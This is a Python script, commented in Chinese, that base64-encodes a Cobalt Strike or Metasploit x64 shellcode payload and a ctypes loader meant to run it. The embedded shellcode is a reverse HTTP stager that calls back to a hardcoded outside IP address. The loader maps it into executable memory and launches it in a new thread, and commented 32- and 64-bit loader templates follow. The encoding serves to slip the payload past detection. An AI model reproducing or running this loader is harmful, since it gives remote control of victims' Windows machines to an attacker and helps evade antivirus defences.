import base64,ctypes

# 编码后输出的cd就是发送端发送的shellcode
# 编码后输出的jz值就是执行上线端的zx
# 无论是shellcode编码还是加载器编码，输出取的值都是b''中单引号之间的值

# shellcode编码，请把cs或者msf生成的playload.c文件里的shellcode复制到b''的单引号之间
cd=b'\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\xa0\x0f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x77\x4a\x34\x68\x00\x94\x5b\x57\xb5\x59\x24\x58\x75\xd7\x6d\x3b\xfb\x9f\x8b\x57\x45\x48\x65\x9c\x12\x86\x11\xc2\x41\x4f\xde\x45\xc2\xc3\x34\xb7\xc4\x8a\x3a\xde\xf7\x3a\x33\x5b\x3f\x5d\x69\xd6\xcd\x99\xb5\x3b\x9b\x29\x94\xd1\x4f\x40\x82\x11\x6d\xb9\x40\x2f\x15\x05\x94\x25\xa7\x38\x85\xdc\x16\x9c\xb8\x66\x9d\xec\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x79\x69\x65\x39\x29\x0d\x0a\x00\xbe\x15\xb7\x0a\xe1\x2b\x6b\x04\x54\xaf\x59\x57\x2f\x39\x92\x83\x12\x3f\x66\xa7\xb6\x6a\xda\xad\xd5\x40\x28\xa6\x84\x99\xae\x80\x3b\xb7\x02\x7e\xc4\xfe\xe1\xab\x31\xb5\x02\x06\x02\x5b\x97\xbb\xea\xa6\x62\xa4\xdc\x58\x00\xa1\x0c\x4c\xac\x17\xa7\x77\xf5\x2f\x6f\x0b\x78\xeb\xef\x38\x34\x77\xc1\x8a\xb9\x57\x60\xb3\x63\x18\x05\x24\x1a\xc5\xa6\x84\xb2\x9a\x4f\x50\x8a\x24\x43\x15\x52\x6f\x73\xfe\xad\x6d\xa6\xee\xb9\x1f\x4c\xbf\x51\x0b\x04\x15\xf7\x9a\xb0\xa6\x3a\x92\x2a\xcc\x99\x49\x15\x1f\x28\x38\x0d\xf0\x81\xd5\x7d\x1f\x50\x0c\x42\x80\xa6\xd1\x5b\x5a\xb9\x15\x67\x9a\x2c\x4e\x79\xeb\x04\xab\x2e\x0f\x59\x28\xe7\x8d\xdd\xc1\x9c\x53\x55\x35\xd9\x8a\x3d\xeb\xd5\xf9\xa0\xe2\x15\xed\xd6\x20\x94\xc0\xd3\x87\x85\xe0\xc5\x42\x11\x42\x74\x45\x0a\x46\x58\xf6\xc6\x4f\xe4\x0a\x01\xca\x28\xa5\x9a\xeb\x4b\xcf\xf4\xa3\xc2\x9d\x79\x63\xca\x04\x2b\x81\x03\xca\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x39\x2e\x31\x37\x39\x2e\x32\x31\x34\x00\x17\x50\x65\xea'
cd=base64.b64encode(cd)
print(cd)


#加载器编码
jz=b'''sc=base64.b64decode(cd)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(sc), len(sc))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
jz=base64.b64encode(jz)'''
jz=base64.b64encode(jz)
print(jz)

# # 64位
# sc=b''
# ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
# shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
# ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(sc), len(sc))
# handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
# ctypes.windll.kernel32.WaitForSingleObject(handle, -1)


# # 32位
# sc=b''
# shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
# ctypes.windll.kernel32.RtlMoveMemory(shangxian, ctypes.create_string_buffer(sc), len(sc))
# handle = ctypes.windll.kernel32.CreateThread(0, 0, shangxian, 0, 0, 0)
# ctypes.windll.kernel32.WaitForSingleObject(handle, -1)